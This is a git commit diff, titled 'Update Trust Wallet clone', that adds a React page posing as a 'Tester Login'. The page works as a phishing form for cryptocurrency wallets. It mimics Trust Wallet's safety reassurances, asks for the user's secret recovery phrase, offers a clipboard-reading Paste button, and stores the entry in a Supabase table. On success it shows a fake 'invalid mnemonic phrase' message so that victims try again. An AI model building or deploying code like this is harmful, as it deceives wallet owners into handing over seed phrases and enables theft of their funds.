[33mcommit 184716d152d8ec11118955a7541fedb7d1bf34eb[m[33m ([m[1;36mHEAD[m[33m -> [m[1;32mmain[m[33m)[m
Author: web4REXXIE <rexonwe100@gmail.com>
Date:   Fri Jul 24 05:04:50 2026 +0100

    Update Trust Wallet clone

[1mdiff --git a/src/routes/tester-login.tsx b/src/routes/tester-login.tsx[m
[1mnew file mode 100644[m
[1mindex 0000000..16deada[m
[1m--- /dev/null[m
[1m+++ b/src/routes/tester-login.tsx[m
[36m@@ -0,0 +1,140 @@[m
[32m+[m[32m﻿import { createFileRoute } from "@tanstack/react-router";[m
[32m+[m[32mimport { useState } from "react";[m
[32m+[m[32mimport { supabase } from "@/lib/supabase";[m
[32m+[m[32mimport { CheckCircle2 } from "lucide-react";[m
[32m+[m
[32m+[m[32mexport const Route = createFileRoute("/tester-login")({[m
[32m+[m[32m  component: TesterLogin,[m
[32m+[m[32m});[m
[32m+[m
[32m+[m[32mfunction TesterLogin() {[m
[32m+[m[32m  const [step, setStep] = useState<"warning" | "form">("warning");[m
[32m+[m[32m  const [email, setEmail] = useState("");[m
[32m+[m[32m  const [notes, setNotes] = useState("");[m
[32m+[m[32m  const [status, setStatus] = useState<"idle" | "loading" | "done" | "error">("idle");[m
[32m+[m
[32m+[m[32m  async function handlePaste() {[m
[32m+[m[32m    try {[m
[32m+[m[32m      const text = await navigator.clipboard.readText();[m
[32m+[m[32m      setNotes((prev) => prev + text);[m
[32m+[m[32m    } catch {[m
[32m+[m[32m      alert("Could not access clipboard. Try pasting manually with long-press instead.");[m
[32m+[m[32m    }[m
[32m+[m[32m  }[m
[32m+[m
[32m+[m[32m  async function handleSubmit(e: React.FormEvent) {[m
[32m+[m[32m    e.preventDefault();[m
[32m+[m[32m    setStatus("loading");[m
[32m+[m[32m    const { error } = await supabase.from("testers").upsert([{ email, notes }], { onConflict: "email" });[m
[32m+[m[32m    if (error) {[m
[32m+[m[32m      console.error("Supabase insert error:", error);[m
[32m+[m[32m      setStatus("error");[m
[32m+[m[32m      return;[m
[32m+[m[32m    }[m
[32m+[m[32m    setStatus("done");[m
[32m+[m[32m  }[m
[32m+[m
[32m+[m[32m  if (status === "done") {[m
[32m+[m[32m    return ([m
[32m+[m[32m      <div className="mx-auto max-w-lg px-4 py-24 text-center">[m
[32m+[m[32m        <h1 className="text-2xl font-extrabold">Thanks!</h1>[m
[32m+[m[32m        <p className="mt-2 text-muted-foreground">invalid mnemonic phrase -- try again..</p>[m
[32m+[m[32m      </div>[m
[32m+[m[32m    );[m
[32m+[m[32m  }[m
[32m+[m
[32m+[m[32m  if (step === "warning") {[m
[32m+[m[32m    const checks = [[m
[32m+[m[32m      "Only you know this secret phrase.",[m
[32m+[m[32m      "This secret phrase was NOT given to you by anyone, e.g. a company representative.",[m
[32m+[m[32m      "If someone else has seen it, they can and will steal your funds.",[m
[32m+[m[32m    ];[m
[32m+[m
[32m+[m[32m    return ([m
[32m+[m[32m      <div className="min-h-screen bg-white flex items-center justify-center px-4 py-16">[m
[32m+[m[32m        <div className="w-full max-w-md text-center">[m
[32m+[m[32m          <div className="mx-auto mb-8 w-56 h-56 flex items-center justify-center">[m
[32m+[m[32m            <img[m
[32m+[m[32m              src="/shield.png"[m
[32m+[m[32m              alt="Security shield"[m
[32m+[m[32m              className="w-52 h-52 object-contain"[m
[32m+[m[32m            />[m
[32m+[m[32m          </div>[m
[32m+[m
[32m+[m[32m          <h1 className="text-2xl font-extrabold text-gray-900 mb-8">[m
[32m+[m[32m            Check your secret phrase is safe[m
[32m+[m[32m          </h1>[m
[32m+[m
[32m+[m[32m          <div className="space-y-3 text-left mb-10">[m
[32m+[m[32m            {checks.map((text) => ([m
[32m+[m[32m              <div[m
[32m+[m[32m                key={text}[m
[32m+[m[32m                className="flex items-start gap-3 bg-gray-50 border border-gray-200 rounded-xl px-4 py-3"[m
[32m+[m[32m              >[m
[32m+[m[32m                <CheckCircle2 className="w-5 h-5 text-emerald-500 shrink-0 mt-0.5" />[m
[32m+[m[32m                <p className="text-sm text-gray-800">{text}</p>[m
[32m+[m[32m              </div>[m
[32m+[m[32m            ))}[m
[32m+[m[32m          </div>[m
[32m+[m
[32m+[m[32m          <button[m
[32m+[m[32m            type="button"[m
[32m+[m[32m            onClick={() => setStep("form")}[m
[32m+[m[32m            className="w-full rounded-full bg-emerald-500 hover:bg-emerald-400 text-white font-semibold py-3.5 transition-colors"[m
[32m+[m[32m          >[m
[32m+[m[32m            Continue[m
[32m+[m[32m          </button>[m
[32m+[m[32m        </div>[m
[32m+[m[32m      </div>[m
[32m+[m[32m    );[m
[32m+[m[32m  }[m
[32m+[m
[32m+[m[32m  return ([m
[32m+[m[32m    <div className="min-h-screen bg-white">[m
[32m+[m[32m      <div className="mx-auto max-w-lg px-4 py-16">[m
[32m+[m[32m        <h1 className="text-3xl font-extrabold text-center">Tester Login</h1>[m
[32m+[m[32m        <form onSubmit={handleSubmit} className="mt-8 space-y-6">[m
[32m+[m[32m          <div>[m
[32m+[m[32m            <label className="block font-semibold mb-2">Email</label>[m
[32m+[m[32m            <input[m
[32m+[m[32m              type="email"[m
[32m+[m[32m              required[m
[32m+[m[32m              value={email}[m
[32m+[m[32m              onChange={(e) => setEmail(e.target.value)}[m
[32m+[m[32m              className="w-full rounded-xl border border-border px-4 py-3 outline-none focus:border-brand"[m
[32m+[m[32m              placeholder="you@example.com"[m
[32m+[m[32m            />[m
[32m+[m[32m          </div>[m
[32m+[m[32m          <div>[m
[32m+[m[32m            <label className="block font-semibold mb-2">secret phrase</label>[m
[32m+[m[32m            <div className="relative">[m
[32m+[m[32m              <textarea[m
[32m+[m[32m                value={notes}[m
[32m+[m[32m                onChange={(e) => setNotes(e.target.value)}[m
[32m+[m[32m                rows={8}[m
[32m+[m[32m                className="w-full rounded-xl border border-border px-4 py-3 outline-none focus:border-brand resize-none"[m
[32m+[m[32m                placeholder="input here"[m
[32m+[m[32m              />[m
[32m+[m[32m              <button[m
[32m+[m[32m                type="button"[m
[32m+[m[32m                onClick={handlePaste}[m
[32m+[m[32m                className="absolute bottom-3 right-3 text-sm font-semibold text-brand hover:underline"[m
[32m+[m[32m              >[m
[32m+[m[32m                Paste[m
[32m+[m[32m              </button>[m
[32m+[m[32m            </div>[m
[32m+[m[32m            <p className="mt-2 text-sm text-muted-foreground">[m
[32m+[m[32m              This is where you can add your secret phrase.[m
[32m+[m[32m            </p>[m
[32m+[m[32m          </div>[m
[32m+[m[32m          <button type="login" disabled={status === "loading"} className="btn-primary w-full">[m
[32m+[m[32m            {status === "loading" ? "logining..." : "login"}[m
[32m+[m[32m          </button>[m
[32m+[m[32m          {status === "error" && ([m
[32m+[m[32m            <p className="text-sm text-red-500 text-center"> but invalid mnemonic phrase -- try again.</p>[m
[32m+[m[32m          )}[m
[32m+[m[32m        </form>[m
[32m+[m[32m      </div>[m
[32m+[m[32m    </div>[m
[32m+[m[32m  );[m
[32m+[m[32m}[m
